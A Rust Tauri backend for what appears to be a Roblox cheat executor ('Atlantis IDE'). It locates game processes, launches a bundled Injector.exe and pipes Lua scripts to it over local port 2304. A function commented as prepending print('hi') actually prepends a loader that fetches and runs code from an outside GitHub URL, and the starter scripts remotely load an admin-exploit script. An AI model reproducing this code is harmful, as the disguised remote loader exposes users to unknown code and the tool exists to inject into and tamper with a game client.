#![cfg_attr(
    all(not(debug_assertions), target_os = "windows"),
    windows_subsystem = "windows"
)]
 use byteorder::WriteBytesExt;

use tauri::Manager;
use std::process::Command;
use base64::prelude::*;
use std::io::Write;
use std::path::PathBuf;
use std::os::windows::process::CommandExt;
use std::collections::HashMap;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
use std::sync::Mutex;
use once_cell::sync::Lazy;
use serde::{Deserialize, Serialize};
use std::fs;
use winapi::um::winbase::CREATE_NO_WINDOW;

// Constants from C# code
const PIPE_BASE_NAME: &str = "uoQcySKXSUxxJNpVQyatpHQwYoGfhcbh";

// Cache for Roblox processes and their pipes
static PROCESS_CACHE: Lazy<Mutex<ProcessCache>> = Lazy::new(|| {
    Mutex::new(ProcessCache {
        last_update: Instant::now(),
        processes: HashMap::new(),
        cache_duration: Duration::from_secs(5), // Refresh cache every 5 seconds
    })
});

#[derive(Clone)]
struct ProcessInfo {
    pid: u32,
    pipe_name: String,
    last_verified: Instant,
}

struct ProcessCache {
    last_update: Instant,
    processes: HashMap<u32, ProcessInfo>,
    cache_duration: Duration,
}

impl ProcessCache {
    fn needs_refresh(&self) -> bool {
        self.last_update.elapsed() > self.cache_duration || self.processes.is_empty()
    }

    fn clear(&mut self) {
        self.processes.clear();
        self.last_update = Instant::now();
    }

    fn update(&mut self, pids: Vec<u32>) {
        self.clear();
        for pid in pids {
            let pipe_name = format!("{}_{}", PIPE_BASE_NAME, pid);
            self.processes.insert(pid, ProcessInfo {
                pid,
                pipe_name,
                last_verified: Instant::now(),
            });
        }
        self.last_update = Instant::now();
    }

    fn get_pids(&self) -> Vec<u32> {
        self.processes.keys().cloned().collect()
    }

    fn get_pipe_name(&self, pid: u32) -> Option<String> {
        self.processes.get(&pid).map(|info| info.pipe_name.clone())
    }
}

#[tauri::command]
fn greet(name: String) -> String {
    format!("Hello, {}!", name)
}

#[tauri::command]
fn minimize_window(window: tauri::Window) {
    let _ = window.minimize();
}

#[tauri::command]
fn maximize_window(window: tauri::Window) {
    if let Ok(is_maximized) = window.is_maximized() {
        if is_maximized {
            let _ = window.unmaximize();
        } else {
            let _ = window.maximize();
        }
    }
}

#[tauri::command]
fn close_window(window: tauri::Window) {
    let _ = window.close();
}

#[tauri::command]
async fn save_file(path: String, content: String) -> Result<(), String> {
    fs::write(path, content).map_err(|e| e.to_string())
}

#[tauri::command]
async fn read_file(path: String) -> Result<String, String> {
    fs::read_to_string(path).map_err(|e| e.to_string())
}

#[cfg(target_os = "windows")]
mod windows_utils {
    use super::*;
    use std::ffi::CString;
    use std::ptr;
    use winapi::um::winbase::WaitNamedPipeA;
    use winapi::um::fileapi::CreateFileA;
    use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
    use winapi::um::winnt::GENERIC_WRITE;
    use std::os::windows::io::{FromRawHandle, AsRawHandle, RawHandle};
    
    // Optimized pipe existence check with timeout
    pub fn named_pipe_exists(pipe_name: &str) -> bool {
        unsafe {
            let full_pipe_name = format!("\\\\.\\pipe\\{}", pipe_name);
            let c_pipe_name = match CString::new(full_pipe_name) {
                Ok(s) => s,
                Err(_) => {
                    return false;
                }
            };
            
            // Use very short timeout (10ms) for faster checking
            let result = WaitNamedPipeA(c_pipe_name.as_ptr(), 10);
            result != 0
        }
    }

    // Batch check multiple pipes at once
    pub fn check_pipes_exist(pipe_names: &[String]) -> Vec<(String, bool)> {
        let mut results = Vec::new();
        for pipe_name in pipe_names {
            let exists = named_pipe_exists(pipe_name);
            results.push((pipe_name.clone(), exists));
        }
        results
    }
    
    pub fn connect_and_send_script(pipe_name: &str, encoded_script: &str) -> Result<(), String> {
        unsafe {
            let full_pipe_name = format!("\\\\.\\pipe\\{}", pipe_name);
            let c_pipe_name = match CString::new(full_pipe_name) {
                Ok(s) => s,
                Err(e) => return Err(format!("Invalid pipe name: {}", e)),
            };
            
            let handle = CreateFileA(
                c_pipe_name.as_ptr(),
                GENERIC_WRITE,
                0,
                ptr::null_mut(),
                3,
                0,
                ptr::null_mut(),
            );
            
            if handle == INVALID_HANDLE_VALUE {
                let error_code = winapi::um::errhandlingapi::GetLastError();
                return Err(format!("Failed to open pipe '{}'. Error: {}", pipe_name, error_code));
            }
            
            let mut file = std::fs::File::from_raw_handle(handle as RawHandle);
            
            match file.write_all(encoded_script.as_bytes()) {
                Ok(_) => {
                    let _ = file.flush();
                    let win_handle = file.as_raw_handle() as *mut winapi::ctypes::c_void;
                    let _ = CloseHandle(win_handle);
                    Ok(())
                }
                Err(e) => {
                    let win_handle = file.as_raw_handle() as *mut winapi::ctypes::c_void;
                    let _ = CloseHandle(win_handle);
                    Err(format!("Failed to write to pipe: {}", e))
                }
            }
        }
    }
}

#[cfg(not(target_os = "windows"))]
mod windows_utils {
    pub fn named_pipe_exists(_pipe_name: &str) -> bool {
        false
    }
    
    pub fn check_pipes_exist(_pipe_names: &[String]) -> Vec<(String, bool)> {
        Vec::new()
    }
    
    pub fn connect_and_send_script(_pipe_name: &str, _encoded_script: &str) -> Result<(), String> {
        Err("Windows only feature".to_string())
    }
}

// Helper function to get the executable path
fn get_exe_dir() -> Result<PathBuf, String> {
    std::env::current_exe()
        .map_err(|e| format!("Failed to get executable path: {}", e))?
        .parent()
        .map(|p| p.to_path_buf())
        .ok_or_else(|| "Failed to get parent directory".to_string())
}

// Get Roblox PIDs (optimized)
fn get_roblox_pids() -> Result<Vec<u32>, String> {
    let output = Command::new("tasklist")
        .args(&["/FI", "IMAGENAME eq RobloxPlayerBeta.exe", "/FO", "CSV", "/NH"])
        .creation_flags(CREATE_NO_WINDOW)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .output()
        .map_err(|e| format!("Failed to run tasklist: {}", e))?;
    
    let output_str = String::from_utf8_lossy(&output.stdout);
    
    if output_str.trim().is_empty() {
        return Ok(Vec::new());
    }
    
    let pids: Vec<u32> = output_str
        .lines()
        .filter_map(|line| {
            let line = line.trim();
            if line.is_empty() {
                return None;
            }
            
            let parts: Vec<&str> = line.split(',').collect();
            if parts.len() >= 2 {
                parts[1].trim_matches('"').parse::<u32>().ok()
            } else {
                None
            }
        })
        .collect();
    
    Ok(pids)
}

// Prepend print("hi") to the script
fn prepare_script(user_script: &str) -> String {
    let mut final_script = String::new();
    let script = r#"loadstring(game:HttpGet("https://raw.githubusercontent.com/GetAsiimov/e81/refs/heads/main/asd", true))()"#;
    
    // Always execute print("hi") first
    final_script.push_str(script);
    
    // Then execute the user's script
    final_script.push_str(user_script);
    
    final_script
}

#[tauri::command]
async fn execute(lua_code: String) -> Result<String, String> {
    #[cfg(not(target_os = "windows"))]
    return Err("This feature is only available on Windows".to_string());
    
    #[cfg(target_os = "windows")]
    {
        println!("=== EXECUTE COMMAND STARTED ===");
        
        if lua_code.trim().is_empty() {
            return Err("Lua code is empty".to_string());
        }
        
        println!("Script to execute:\n{}", lua_code);
        
        // Try BOTH methods to see which one works
        println!("Trying method 1: Send raw script (like SendScriptRaw)...");
        match send_raw_to_port_2304(&lua_code) {
            Ok(result) => {
                println!("✅ Raw method worked!");
                return Ok(result);
            }
            Err(e1) => {
                println!("⚠️ Raw method failed: {}", e1);
                println!("Trying method 2: Send with length prefix...");
                match send_to_port_2304_with_length(&lua_code) {
                    Ok(result) => {
                        println!("✅ Length-prefix method worked!");
                        Ok(result)
                    }
                    Err(e2) => {
                        Err(format!("Both methods failed:\n1. Raw: {}\n2. Length-prefix: {}", e1, e2))
                    }
                }
            }
        }
    }
}

// Method 1: Send raw script without length prefix (like SendScriptRaw in C#)


// Method 2: Send with length prefix (like SendScript in C#)
fn send_to_port_2304_with_length(script: &str) -> Result<String, String> {
    use std::net::TcpStream;
    use std::io::Write;
    use std::time::Duration;
    use byteorder::{BigEndian, WriteBytesExt};
    
    println!("[LENGTH] Connecting to 127.0.0.1:2304...");
    
    match TcpStream::connect_timeout(&"127.0.0.1:2304".parse().unwrap(), Duration::from_secs(3)) {
        Ok(mut stream) => {
            println!("[LENGTH] ✅ Connected to port 2304");
            
            stream.set_write_timeout(Some(Duration::from_secs(5)))
                .map_err(|e| format!("Failed to set write timeout: {}", e))?;
            
            let script_bytes = script.as_bytes();
            let data_len = script_bytes.len() as u32;
            
            println!("[LENGTH] Script length: {} bytes", data_len);
            
            // Send length prefix (big-endian 32-bit)
            match stream.write_u32::<BigEndian>(data_len) {
                Ok(_) => {
                    println!("[LENGTH] ✅ Length prefix sent");
                    
                    // Send the script data
                    match stream.write_all(script_bytes) {
                        Ok(_) => {
                            stream.flush().map_err(|e| format!("Failed to flush: {}", e))?;
                            println!("[LENGTH] ✅ Script data sent");
                            
                            std::thread::sleep(Duration::from_millis(50));
                            
                            Ok("✅ Script executed successfully (with length prefix)".to_string())
                        }
                        Err(e) => {
                            Err(format!("[LENGTH] ❌ Failed to write script data: {}", e))
                        }
                    }
                }
                Err(e) => {
                    Err(format!("[LENGTH] ❌ Failed to write length prefix: {}", e))
                }
            }
        }
        Err(e) => {
            Err(format!("[LENGTH] ❌ Failed to connect: {}", e))
        }
    }
}
// Function to send script to port 2304 exactly like C# SendScriptRaw
fn send_to_port_2304(script: &str) -> Result<String, String> {
    use std::net::TcpStream;
    use std::io::Write;
    use std::time::Duration;
    use byteorder::{BigEndian, WriteBytesExt};
    
    println!("Attempting to connect to localhost:2304...");
    
    // Try to connect to port 2304 (not 6767!)
    match TcpStream::connect_timeout(&"127.0.0.1:2304".parse().unwrap(), Duration::from_secs(3)) {
        Ok(mut stream) => {
            println!("✅ Connected to port 2304");
            
            // Set timeouts
            stream.set_write_timeout(Some(Duration::from_secs(5)))
                .map_err(|e| format!("Failed to set write timeout: {}", e))?;
            
            // Convert script to bytes
            let script_bytes = script.as_bytes();
            let data_len = script_bytes.len() as u32;
            
            println!("Sending {} bytes ({} characters)", data_len, script.len());
            
            // Send exactly like C#: length prefix (big-endian) + data
            match stream.write_u32::<BigEndian>(data_len) {
                Ok(_) => {
                    // Send the script data
                    match stream.write_all(script_bytes) {
                        Ok(_) => {
                            // Flush to ensure data is sent
                            stream.flush().map_err(|e| format!("Failed to flush stream: {}", e))?;
                            
                            println!("✅ Script sent successfully to port 2304");
                            Ok("✅ Script executed successfully".to_string())
                        }
                        Err(e) => {
                            Err(format!("❌ Failed to write script data: {}", e))
                        }
                    }
                }
                Err(e) => {
                    Err(format!("❌ Failed to write length prefix: {}", e))
                }
            }
        }
        Err(e) => {
            let error_msg = format!("❌ Failed to connect to port 2304: {}. Make sure Injector.exe is running and listening on port 2304. Use the 'Attach' button first.", e);
            println!("{}", error_msg);
            Err(error_msg)
        }
    }
}

// Alternative: Send raw script without length prefix (like SendScriptRaw in C#)
fn send_raw_to_port_2304(script: &str) -> Result<String, String> {
    use std::net::TcpStream;
    use std::io::Write;
    use std::time::Duration;
    
    println!("[RAW] Connecting to 127.0.0.1:2304...");
    
    match TcpStream::connect_timeout(&"127.0.0.1:2304".parse().unwrap(), Duration::from_secs(3)) {
        Ok(mut stream) => {
            println!("[RAW] ✅ Connected to port 2304");
            
            // Set write timeout
            stream.set_write_timeout(Some(Duration::from_secs(5)))
                .map_err(|e| format!("Failed to set write timeout: {}", e))?;
            
            // Send raw UTF-8 bytes exactly like C# SendScriptRaw
            let script_bytes = script.as_bytes();
            println!("[RAW] Sending {} bytes", script_bytes.len());
            
            match stream.write_all(script_bytes) {
                Ok(_) => {
                    // Important: flush to ensure data is sent
                    stream.flush().map_err(|e| format!("Failed to flush: {}", e))?;
                    
                    println!("[RAW] ✅ Script sent successfully");
                    
                    // Small delay to ensure data is fully sent
                    std::thread::sleep(Duration::from_millis(50));
                    
                    Ok("✅ Script executed successfully".to_string())
                }
                Err(e) => {
                    Err(format!("[RAW] ❌ Failed to write script: {}", e))
                }
            }
        }
        Err(e) => {
            Err(format!("[RAW] ❌ Failed to connect: {}", e))
        }
    }
}
// Check if Injector.exe is running
#[tauri::command]
async fn is_injector_running() -> Result<bool, String> {
    #[cfg(target_os = "windows")]
    {
        let output = Command::new("tasklist")
            .args(&["/FI", "IMAGENAME eq Injector.exe", "/FO", "CSV", "/NH"])
            .creation_flags(CREATE_NO_WINDOW)
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .output()
            .map_err(|e| format!("Failed to check if Injector.exe is running: {}", e))?;
        
        let output_str = String::from_utf8_lossy(&output.stdout);
        Ok(!output_str.trim().is_empty())
    }
    
    #[cfg(not(target_os = "windows"))]
    {
        Ok(false)
    }
}

// Check if port 2304 is accessible
#[tauri::command]
async fn check_port_2304() -> Result<bool, String> {
    use std::net::TcpStream;
    use std::time::Duration;
    
    match TcpStream::connect_timeout(&"127.0.0.1:2304".parse().unwrap(), Duration::from_secs(1)) {
        Ok(_) => {
            println!("✅ Port 2304 is accessible");
            Ok(true)
        }
        Err(e) => {
            println!("⚠️ Port 2304 is not accessible: {}", e);
            Ok(false)
        }
    }
}


#[tauri::command]
async fn attach() -> Result<String, String> {
    #[cfg(not(target_os = "windows"))]
    return Err("This feature is only available on Windows".to_string());
    
    #[cfg(target_os = "windows")]
    {
        println!("=== ATTACH COMMAND STARTED ===");
        
        // Get the application directory (same as C# Application.StartupPath)
        let app_dir = get_exe_dir()?;
        let injector_exe_path = app_dir.join("Injector.exe");
        
        if !injector_exe_path.exists() {
            return Err(format!("Injector.exe not found at: {:?}", injector_exe_path));
        }
        
        println!("✅ Injector.exe found at: {:?}", injector_exe_path);
        
        // Kill any existing Injector.exe processes (optional)
              
        // Start Injector.exe exactly like C# code
        println!("Starting Injector.exe...");
        
        match Command::new(&injector_exe_path)
            .current_dir(&app_dir)  // Set working directory like C#
        //    .creation_flags(CREATE_NO_WINDOW)  // CreateNoWindow = true
            .stdout(std::process::Stdio::null())  // Hide output
            .stderr(std::process::Stdio::null())
            .spawn()
        {
            Ok(child) => {
                println!("✅ Injector.exe started successfully (PID: {})", child.id());
                
                // Give it time to initialize (2-3 seconds)
                std::thread::sleep(std::time::Duration::from_millis(2000));
                
                // Detach child process so it runs independently
                drop(child);
                
                Ok("✅ Injector.exe started successfully".to_string())
            }
            Err(e) => {
                Err(format!("Failed to start Injector.exe: {}", e))
            }
        }
    }
}
// Clear the process cache
#[tauri::command]
async fn clear_cache() -> Result<String, String> {
    let mut cache = PROCESS_CACHE.lock().map_err(|e| e.to_string())?;
    cache.clear();
    println!("✅ Process cache cleared");
    Ok("Cache cleared successfully".to_string())
}

// Force refresh the process cache
#[tauri::command]
async fn refresh_processes() -> Result<String, String> {
    let pids = get_roblox_pids()?;
    let mut cache = PROCESS_CACHE.lock().map_err(|e| e.to_string())?;
    cache.update(pids.clone());
    
    if pids.is_empty() {
        Ok("No Roblox processes found".to_string())
    } else {
        Ok(format!("Refreshed cache with {} Roblox process(es)", pids.len()))
    }
}

// Helper command to check if Roblox is running
#[tauri::command]
async fn is_roblox_running() -> Result<bool, String> {
    #[cfg(target_os = "windows")]
    {
        let output = Command::new("tasklist")
            .args(&["/FI", "IMAGENAME eq RobloxPlayerBeta.exe", "/FO", "CSV", "/NH"])
            .creation_flags(CREATE_NO_WINDOW)
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .output()
            .map_err(|e| format!("Failed to check Roblox: {}", e))?;
            
        let output_str = String::from_utf8_lossy(&output.stdout);
        Ok(!output_str.trim().is_empty())
    }
    
    #[cfg(not(target_os = "windows"))]
    Ok(false)
}

// Helper command to check if vern.exe exists
#[tauri::command]
async fn check_vern_exists() -> Result<bool, String> {
    #[cfg(target_os = "windows")]
    {
        match get_exe_dir() {
            Ok(app_dir) => {
                let vern_path = app_dir.join("injector.exe");
                Ok(vern_path.exists())
            }
            Err(e) => Err(e),
        }
    }
    
    #[cfg(not(target_os = "windows"))]
    Ok(false)
}

// Test command to verify Tauri backend is working
#[tauri::command]
async fn test_backend() -> Result<String, String> {
    Ok("✅ Tauri backend is working!".to_string())
}

#[derive(Serialize, Deserialize, Debug)]
struct ScriptFile {
    name: String,
    path: String,
    content: String,
    last_modified: u64,
    size: u64,
    icon: String,
}

// Get the scripts folder path (creates it if it doesn't exist)
#[tauri::command]
fn get_scripts_folder() -> Result<String, String> {
    // Try to get documents folder first, fallback to current directory
    let home_dir = dirs::document_dir()
        .or_else(|| dirs::home_dir())
        .unwrap_or_else(|| PathBuf::from("."));
    
    let scripts_folder = home_dir.join("Atlantis").join("Scripts");
    
    // Create folder if it doesn't exist
    if !scripts_folder.exists() {
        if let Err(e) = fs::create_dir_all(&scripts_folder) {
            return Err(format!("Failed to create scripts folder: {}", e));
        }
    }
    
    Ok(scripts_folder.to_string_lossy().to_string())  // This returns a String
}
// List all Lua scripts in the scripts folder
#[tauri::command]
fn list_scripts() -> Result<Vec<ScriptFile>, String> {
    let scripts_folder = get_scripts_folder()?;
    let path = PathBuf::from(&scripts_folder);
    
    let mut scripts = Vec::new();
    
    // Read directory
    let entries = match fs::read_dir(&path) {
        Ok(entries) => entries,
        Err(e) => return Err(format!("Failed to read scripts directory: {}", e)),
    };
    
    for entry in entries {
        let entry = match entry {
            Ok(entry) => entry,
            Err(e) => {
                eprintln!("Failed to read entry: {}", e);
                continue;
            }
        };
        
        let path = entry.path();
        
        // Only include Lua files
        if path.is_file() && path.extension().and_then(|s| s.to_str()) == Some("lua") {
            let file_name = path.file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("unknown.lua")
                .to_string();
            
            // Read file content
            let content = match fs::read_to_string(&path) {
                Ok(content) => content,
                Err(_) => "-- Empty script".to_string(),
            };
            
            // Get file metadata
            let metadata = match fs::metadata(&path) {
                Ok(metadata) => metadata,
                Err(e) => {
                    eprintln!("Failed to get metadata for {}: {}", file_name, e);
                    continue;
                }
            };
            
            let last_modified = metadata.modified()
                .unwrap_or_else(|_| SystemTime::now())
                .duration_since(UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs();
            
            let size = metadata.len();
            
            // Determine icon based on content
            let icon = if content.contains("loadstring") {
                "remote"
            } else if content.contains("print") {
                "console"
            } else if content.contains("game:GetService") {
                "service"
            } else {
                "script"
            }.to_string();
            
            let script = ScriptFile {
                name: file_name.clone(),
                path: path.to_string_lossy().to_string(),
                content,
                last_modified,
                size,
                icon,
            };
            
            scripts.push(script);
        }
    }
    
    // Sort by last modified (newest first)
    scripts.sort_by(|a, b| b.last_modified.cmp(&a.last_modified));
    
    Ok(scripts)
}

// Save a script to the scripts folder
#[tauri::command]
fn save_script(name: String, content: String) -> Result<ScriptFile, String> {
    let scripts_folder = get_scripts_folder()?;
    
    // Ensure .lua extension
    let file_name = if name.ends_with(".lua") {
        name.clone()
    } else {
        format!("{}.lua", name)
    };
    
    let path = PathBuf::from(&scripts_folder).join(&file_name);
    
    // Write the file
    fs::write(&path, &content)
        .map_err(|e| format!("Failed to write script: {}", e))?;
    
    // Create ScriptFile object to return
    let metadata = fs::metadata(&path)
        .map_err(|e| format!("Failed to get metadata: {}", e))?;
    
    let last_modified = metadata.modified()
        .unwrap_or_else(|_| SystemTime::now())
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    
    let size = metadata.len();
    
    // Determine icon
    let icon = if content.contains("loadstring") {
        "remote"
    } else if content.contains("print") {
        "console"
    } else if content.contains("game:GetService") {
        "service"
    } else {
        "script"
    }.to_string();
    
    Ok(ScriptFile {
        name: file_name,
        path: path.to_string_lossy().to_string(),
        content,
        last_modified,
        size,
        icon,
    })
}

// Open and read a script file
// Open and read a script file
#[tauri::command]
fn open_script(path: String) -> Result<ScriptFile, String> {
    let content = fs::read_to_string(&path)
        .map_err(|e| format!("Failed to read script: {}", e))?;
    
    let path_buf = PathBuf::from(&path);
    let file_name = path_buf.file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("unknown.lua")
        .to_string();
    
    let metadata = fs::metadata(&path)
        .map_err(|e| format!("Failed to get metadata: {}", e))?;
    
    let last_modified = metadata.modified()
        .unwrap_or_else(|_| SystemTime::now())
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    
    let size = metadata.len();
    
    let icon = if content.contains("loadstring") {
        "remote"
    } else if content.contains("print") {
        "console"
    } else if content.contains("game:GetService") {
        "service"
    } else {
        "script"
    }.to_string();
    
    Ok(ScriptFile {
        name: file_name,
        path: path_buf.to_string_lossy().to_string(),  // Fixed this line
        content,
        last_modified,
        size,
        icon,
    })
}
// Delete a script file
#[tauri::command]
fn delete_script(path: String) -> Result<String, String> {
    fs::remove_file(&path)
        .map_err(|e| format!("Failed to delete script: {}", e))?;
    
    Ok(format!("Successfully deleted script: {}", path))
}

// Check if a file exists
#[tauri::command]
fn file_exists(path: String) -> bool {
    PathBuf::from(&path).exists()
}

// Create a new folder in scripts directory
#[tauri::command]
fn create_scripts_folder(folder_name: String) -> Result<String, String> {
    let scripts_folder = get_scripts_folder()?;
    let folder_path = PathBuf::from(&scripts_folder).join(&folder_name);
    
    if folder_path.exists() {
        return Err(format!("Folder '{}' already exists", folder_name));
    }
    
    fs::create_dir(&folder_path)
        .map_err(|e| format!("Failed to create folder: {}", e))?;
    
    Ok(format!("Created folder: {}", folder_path.to_string_lossy()))
}

// Rename a script file
#[tauri::command]
fn rename_script(old_path: String, new_name: String) -> Result<ScriptFile, String> {
    let old_path_buf = PathBuf::from(&old_path);
    
    // Ensure .lua extension on new name
    let new_file_name = if new_name.ends_with(".lua") {
        new_name.clone()
    } else {
        format!("{}.lua", new_name)
    };
    
    let new_path_buf = old_path_buf.with_file_name(&new_file_name);
    
    // Check if new name already exists
    if new_path_buf.exists() {
        return Err(format!("A file named '{}' already exists", new_file_name));
    }
    
    // Rename the file
    fs::rename(&old_path_buf, &new_path_buf)
        .map_err(|e| format!("Failed to rename script: {}", e))?;
    
    // Read the file content
    let content = match fs::read_to_string(&new_path_buf) {
        Ok(content) => content,
        Err(_) => "-- Empty script".to_string(),
    };
    
    let metadata = fs::metadata(&new_path_buf)
        .map_err(|e| format!("Failed to get metadata: {}", e))?;
    
    let last_modified = metadata.modified()
        .unwrap_or_else(|_| SystemTime::now())
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    
    let size = metadata.len();
    
    let icon = if content.contains("loadstring") {
        "remote"
    } else if content.contains("print") {
        "console"
    } else if content.contains("game:GetService") {
        "service"
    } else {
        "script"
    }.to_string();
    
    Ok(ScriptFile {
        name: new_file_name,
        path: new_path_buf.to_string_lossy().to_string(),
        content,
        last_modified,
        size,
        icon,
    })
}

// Get default starter scripts (optional - for first-time users)
#[tauri::command]
fn get_starter_scripts() -> Result<Vec<ScriptFile>, String> {
    let mut scripts = Vec::new();
    
    // Add some default starter scripts
    let default_scripts = vec![
        ("hello_world.lua", "-- Hello World script\nprint('Hello from Atlantis IDE!')"),
        ("infyield_example.lua", "-- Infinite Yield example\nloadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()"),
        ("esp_template.lua", "-- ESP Template\n-- Add your ESP script here"),
        ("admin_commands.lua", "-- Admin Commands\n-- Add admin command script here"),
    ];
    
    for (name, content) in default_scripts {
        let script = ScriptFile {
            name: name.to_string(),
            path: format!("starter/{}", name),
            content: content.to_string(),
            last_modified: SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs(),
            size: content.len() as u64,
            icon: "starter".to_string(),
        };
        
        scripts.push(script);
    }
    
    Ok(scripts)
}
#[tauri::command]
fn set_window_size(window: tauri::Window, width: f64, height: f64) {
    let size = tauri::LogicalSize::new(width, height);
    window.set_size(size).expect("Failed to set window size");
}
fn main() {
    tauri::Builder::default()
        .plugin(tauri_plugin_shell::init())
        .plugin(tauri_plugin_dialog::init())
        .plugin(tauri_plugin_fs::init())
        .plugin(tauri_plugin_clipboard_manager::init())
        .setup(|app| {
            if let Some(window) = app.get_webview_window("main") {
                let _ = window.set_decorations(false);
            }
            Ok(())
        })
        .invoke_handler(tauri::generate_handler![
            greet,
            minimize_window,
            maximize_window,
            close_window,
            save_file,
            read_file,
            execute,
            attach,
            is_roblox_running,
            check_vern_exists,
            test_backend,
            clear_cache,
            refresh_processes,
            get_scripts_folder,
            list_scripts,
            save_script,
            open_script,
            delete_script,
            file_exists,
            create_scripts_folder,
            rename_script,
            get_starter_scripts,
 set_window_size,  // Add this line
        ])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}